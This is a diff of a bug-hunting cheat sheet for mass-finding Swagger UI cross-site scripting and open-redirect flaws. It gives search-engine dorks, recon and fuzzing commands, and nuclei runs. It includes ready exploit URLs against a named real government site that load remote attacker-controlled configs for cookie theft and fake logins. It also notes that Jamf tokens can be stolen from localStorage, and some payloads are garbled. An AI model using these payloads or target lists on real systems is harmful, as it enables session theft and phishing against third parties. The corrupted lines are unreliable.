@@ -1,28 +1,25 @@
-Swagger XSS/Html/OpenRedirect Mass Hunting by coffinxp:
-
 Google Dork:
-site:*.swagger.io -www
-intitle:"Swagger UI" intitle:"Swagger UI" site:target.com
+site:\*.swagger.io -www
+intext:"Swagger UI" intitle:"Swagger UI" site:Target.com
 site:nasa.gov inurl:(swagger-ui OR swagger.json OR swagger.yaml)
 inurl:"/swagger-ui/index.html"
 
-intitle:"Swagger UI" (inurl:"/swagger-ui/" OR inurl:"/swagger/" OR inurl:"/api-docs/" OR inurl:"/v2/api-docs" OR inurl:"/v3/api-docs" OR
-inurl:"swagger.json" OR inurl:"swagger.yaml") -github -gitlab -stackoverflow site:nasa.gov
-site:nasa.gov (inurl:api OR inurl:apis OR inurl:graphql OR inurl:swagger OR inurl:v1 OR inurl:v2 OR inurl:v3) (filetype:json OR filetype:yaml OR
-filetype:xml)
+intitle:"Swagger UI" (inurl:"/swagger-ui/" OR inurl:"/swagger/" OR inurl:"/api-docs/" OR inurl:"/v2/api-docs" OR inurl:"/v3/api-docs" OR inurl:"swagger.json" OR inurl:"swagger.yaml") -github -gitlab -stackoverflow site:nasa.gov
+
+site:nasa.gov (inurl:api OR inurl:apis OR inurl:graphql OR inurl:swagger OR inurl:v1 OR inurl:v2 OR inurl:v3) (filetype:json OR filetype:yaml OR filetype:xml)
 
 Github Dork:
-/swagger-ui-dist" : "3.[1-3]/path/*/package.json
-repo:ORG/REPO "https:///" OR "http:///" OR ".com"
-repo:strap1/strapi ("https:///" OR "http:///" OR ".com")
+/swagger-ui-dist":"^3.[1-3]/" path:\*/package.json
+repo:ORG/REPO "https://" OR "http://" OR ".com"
+repo:strapi/strapi ("https://" OR "http://" OR ".com")
 
-Gitleaks Search:
-- services.endpoints.http.body:{"swagger", "swagger-ui"}
-web.endpoints.http.body:{"swagger", "swagger-ui"}
-host.services.endpoints.http.body:{"swagger", "swagger-ui"} or web.endpoints.http.body:{"swagger", "swagger-ui"}
+Cencys search:
+host.services.endpoints.http.body:("swagger", "swagger-ui")
+web.endpoints.http.body:("swagger", "swagger-ui")
+host.services.endpoints.http.body:("swagger", "swagger-ui") or web.endpoints.http.body:("swagger", "swagger-ui")
 
-FoFa-Query:
-"redacted.com" && (icon_hash="-1189440057" || icon_hash="-1128940573" || icon_hash="-1839822816" || icon_hash="-1120729672")
+Fofa-Query:
+"redacted.com" && (icon\_hash="-1180440057" || icon\_hash="-1128940573" || icon\_hash="-1839822816" || icon\_hash="1120729672")
 
 Shodan-Query:
 http.component:"Swagger"
@@ -30,9 +27,41 @@ http.title:"Swagger UI"
 http.html:"swagger-ui"
 http.component:"Swagger" http.title:"Swagger UI" http.html:"swagger-ui"
 http.favicon.hash:"-1128940573"
-http.title:"Swagger UI" +280
+http.title:"Swagger UI" +200
 http.title:"Swagger UI" hostname:"getsling.com"
 
+Chaining subfinder and httpx:
+subfinder -d getsling.com -all | httpx-toolkit -silent -title | grep 'Swagger UI'
+cat swagger.txt | httpx-toolkit -silent -title | grep -ei "swagger|openapi|redoc|rapidoc"
+echo "example.com" | httpx -path /docs,/swagger,/api-docs,/swagger-ui,/swagger-ui.html
+
+Bruteforce:
+ffuf -w /root/wordlist/api/swagger\_xss.txt:FUZZ -u alive\_ones.txt:URL -u URLFUZZ -mc 200 -o ffuf-result.txt
+dirsearch -u [https://api.getsling.com](https://api.getsling.com) -w payloads/swagger.txt -e html,json,yaml,js -t 20 --random-agent --force-recursive --full-url
+
+[https://eservices.zambiaimmigration.gov.zm/api/swagger/ui/index?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/login.json]
+(https://www.google.com/search?q=https://eservices.zambiaimmigration.gov.zm/api/swagger/ui/index%3FconfigUrl%3Dhttps://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/login.json)
+[https://eservices.zambiaimmigration.gov.zm/api/swagger/ui/index?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/rlogin.json]
+(https://www.google.com/search?q=https://eservices.zambiaimmigration.gov.zm/api/swagger/ui/index%3FconfigUrl%3Dhttps://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/rlogin.json)
+[https://eservices.zambiaimmigration.gov.zm/api/swagger/ui/index?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsstest.json]
+(https://www.google.com/search?q=https://eservices.zambiaimmigration.gov.zm/api/swagger/ui/index%3FconfigUrl%3Dhttps://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsstest.json)
+[https://eservices.zambiaimmigration.gov.zm/api/swagger/ui/index?configUrl=https://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsscookie.json]
+(https://www.google.com/search?q=https://eservices.zambiaimmigration.gov.zm/api/swagger/ui/index%3FconfigUrl%3Dhttps://raw.githubusercontent.com/coffinxp/swagger/refs/heads/main/xsscookie.json)
+
+Jamf:
+Jamf Pro is an Apple device management tool that stores authentication tokens in localStorage under the authToken key
+
+/nuclei-templates/headless/cves/2018/CVE-2018-25031.yaml
+https://VULNERABLE\_JAMF/classicapi/doc/?configUrl=data:text/html;base64,ewoidXNlciI6ImRocHMiLCJyaWdodCI6IHV6IyIwfQo%3D.Lmnlmo\!N3roL3\!eqiuea\!FtBCiTkQ==
+http://your-swagger-url/?url=k3cScript%3Ealert(/atob(%22SGVsbG8gQWxlcnQh%22))%3C/script%3E
+
+
+
+> cat ip.txt | nuclei -t nt/fav/Swagger.yaml
+
+
+
+> cat swagger.txt | awk -F/ '{print $3}' | sort -u | nuclei -t /home//nt/fav/Swagger.yaml
 
 use shordan web browser download ip and domain f12 clonsone log paste
 
